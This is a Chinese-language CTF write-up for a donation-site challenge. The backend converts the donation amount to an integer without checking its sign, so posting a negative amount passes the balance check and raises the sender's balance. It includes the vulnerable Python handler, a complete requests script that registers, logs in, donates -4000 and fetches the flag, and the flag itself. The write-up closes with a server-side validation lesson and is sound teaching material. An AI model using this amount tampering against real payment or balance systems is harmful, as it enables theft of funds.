# Donations

## 题目简述

网站允许注册、登录并向固定用户 `lisanalgaib` 捐款。新用户有 1000 单位货币，只有余额达到 5000 才能访问 `/api/flag`。前端把捐款输入框限制为非负数，但后端没有验证金额符号。

## 解题过程

`POST /api/donate` 把表单中的 `currency` 直接转换成 Python 整数：

```python
currency = int(params["currency"])
```

余额检查和转账随后写成：

```python
if from_user["currency"] < currency:
    raise HTTPException(status_code=403, detail="you're too poor")

from_user["currency"] -= currency
to_user["currency"] += currency
```

若提交 `currency=-4000`，`1000 < -4000` 为假，因此余额检查不会拦截；扣除负数则变成：

$$
1000-(-4000)=5000
$$

前端的 `<input type="number" min={0}>` 只影响浏览器交互，直接构造 HTTP 请求即可绕过。完整请求流程如下，其中 `BASE` 是后端 API 地址，而不是前端地址：

```python
import requests

BASE = "https://<api-host>"
session = requests.Session()

session.post(
    f"{BASE}/api/register",
    data={"username": "attacker", "password": "attacker-pass"},
).raise_for_status()

session.post(
    f"{BASE}/api/login",
    data={"username": "attacker", "password": "attacker-pass"},
).raise_for_status()

session.post(
    f"{BASE}/api/donate",
    data={"to": "lisanalgaib", "currency": "-4000"},
).raise_for_status()

response = session.get(f"{BASE}/api/flag")
print(response.text)
```

同一个 `requests.Session` 必须贯穿登录、捐款和取旗过程，因为登录状态保存在 `session` Cookie 中。输出：

```text
UMDCTF{BE20$_1s_7h3_T0N6U3_OF_Th3_uN5e3N}
```

## 方法总结

漏洞是典型的负数金额业务逻辑错误：后端验证了“余额是否小于转账额”，却没有先要求转账额大于零。负数同时绕过余额检查并把减法变成加法。客户端输入限制不是安全边界，金额的类型、范围和符号都必须由服务端验证。
